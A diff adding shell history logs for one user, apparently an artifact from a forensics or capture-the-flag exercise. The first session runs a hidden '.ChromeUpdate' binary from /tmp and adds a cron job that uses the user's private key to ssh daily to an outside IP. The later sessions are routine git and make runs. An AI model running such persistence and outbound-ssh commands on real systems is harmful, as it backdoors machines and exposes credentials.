@@ -1,0 +1,76 @@
+# cranjis.mcbasketball session on 10.10.10.5 at 20-May 8:09
+whoami
+cd /tmp
+ls -la
+ls -latr
+chmod +x .ChromeUpdate
+./.ChromeUpdate
+echo '37 8 * * * /usr/bin/ssh -i /home/cranjis/.ssh/id_rsa user@31.82.210.154' >> m.f
+crontab -e
+exit
+
+# cranjis.mcbasketball session on 10.10.10.5 at 20-May 8:37
+whoami
+git status
+make && make test || echo 'fix this later'
+exit
+
+# cranjis.mcbasketball session on 10.10.10.5 at 20-May 10:15
+whoami
+git status
+make && make test || echo 'fix this later'
+exit
+
+# cranjis.mcbasketball session on 10.10.10.5 at 21-May 8:15
+whoami
+git status
+make && make test || echo 'fix this later'
+exit
+
+# cranjis.mcbasketball session on 10.10.10.5 at 21-May 8:37
+whoami
+git status
+make && make test || echo 'fix this later'
+exit
+
+# cranjis.mcbasketball session on 10.10.10.5 at 21-May 8:42
+whoami
+git status
+make && make test || echo 'fix this later'
+exit
+
+# cranjis.mcbasketball session on 10.10.10.5 at 22-May 8:37
+whoami
+git status
+make && make test || echo 'fix this later'
+exit
+
+# cranjis.mcbasketball session on 10.10.10.5 at 22-May 13:48
+whoami
+git status
+make && make test || echo 'fix this later'
+exit
+
+# cranjis.mcbasketball session on 10.10.10.5 at 23-May 8:17
+whoami
+git status
+make && make test || echo 'fix this later'
+exit
+
+# cranjis.mcbasketball session on 10.10.10.5 at 23-May 8:37
+whoami
+git status
+make && make test || echo 'fix this later'
+exit
+
+# cranjis.mcbasketball session on 10.10.10.5 at 24-May 8:37
+whoami
+git status
+make && make test || echo 'fix this later'
+exit
+
+# cranjis.mcbasketball session on 10.10.10.5 at 24-May 19:29
+whoami
+git status
+make && make test || echo 'fix this later'
+exit
